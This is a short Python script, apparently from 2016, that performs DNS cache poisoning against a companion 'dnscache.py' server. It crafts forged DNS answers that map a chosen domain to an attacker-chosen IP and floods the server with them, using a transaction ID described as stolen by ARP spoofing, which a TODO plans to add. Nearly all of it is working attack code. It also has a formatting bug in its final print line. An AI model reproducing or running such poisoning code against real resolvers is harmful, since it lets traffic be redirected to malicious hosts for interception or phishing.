# !/usr/bin/python3
# -*- coding: utf-8 -*-
"""Module for dns poisoning exploit
TODO: ARP-Spoofing for getting id"""


import argparse
import struct
import socket
from dnscache import IP, ask


ID = 666 # Stolen by ARP-Spoofing id of the packet


def parser():
    parser = argparse.ArgumentParser(prog="dns_poison_exploit",
                                     description="""Simple dns poisoning. 
                                     Always work on dnscache.py in same dir""",
                                     usage="py main.py",
                                     epilog="DimaStark 2016 (c)")
    parser.add_argument("-ip", type=IP, 
                               default="127.0.0.1", 
                               help="server IP")
    parser.add_argument("-port", type=int, 
                                 default=53, 
                                 help="server port")
    parser.add_argument("domain", type=str, help="domain name for poisoning")
    parser.add_argument("poison", type=IP, help="IP for poisoning")
    parser.add_argument("-c", type=int, help="Count of poison packets", default=100)
    return parser


def create_dns_packet(name):
    """Dns packet for domain name"""
    flags = 256
    questions = 1
    answers = 1
    authorities = 0
    additionals = 0
    header = struct.pack("!HHHHHH",
                         ID, flags, questions,
                         answers, authorities, additionals)
    parts = name.split('.')
    enc_data = b""
    for part in parts:
        enc_data += struct.pack("!B", len(part)) + part.encode()
    enc_data += b"\x00"
    question = enc_data + b"\x00\x01\x00\x01"
    return header + question


def create_dns_packet_with_ans(name, ip):
    """Dns packet for domain name with poison"""
    pack = create_dns_packet(name)
    b_ip = bytes([int(i) for i in ip.split('.')])
    answer = b"\xC0\x0C\x00\x01\x00\x01\x00\x00\x01+\x00\x04" + b_ip
    return pack + answer


def send_spoof_data(server_addr, pack, count):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(count):
        sock.sendto(pack, server_addr)
    print("send {} poisoned packets" % count)


def main():
    args = parser().parse_args()
    poison = args.poison
    server_addr = args.ip, args.port
    pack = create_dns_packet(args.domain)
    poison_pack = create_dns_packet_with_ans(args.domain, poison)
    ask(pack, server_addr)
    send_spoof_data(server_addr, poison_pack, args.c)


if __name__ == '__main__':
    main()